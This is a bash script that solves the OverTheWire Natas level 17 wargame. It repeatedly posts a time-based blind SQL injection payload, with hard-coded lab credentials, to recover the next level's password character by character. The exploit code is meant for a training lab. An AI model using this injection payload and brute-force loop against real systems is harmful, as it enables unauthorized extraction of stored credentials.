
declare -a password=()
post_form(){
	# here `gtimeout` is for mac, linux just need `timeout`
	gtimeout 100s curl -isu natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw http://natas17.natas.labs.overthewire.org?debug=1 -F username="natas18\" and if(password like binary \""$1%"\", sleep(100), 1) and \"1" &
	pids=$!
	wait "$pids"
}



while [ ${#password} -lt 32 ];
do
	for n in {a..z} {A..Z} {0..9}
	do
		val="$(post_form "$password$n")"
		if [ ${#val} -eq 0 ]; then
			echo "--------------------"
			echo "[+] currect part $password$n"
			echo "--------------------"
			password+=$n
		else
			echo "[-] faile with $password$n "
		fi
	done
done
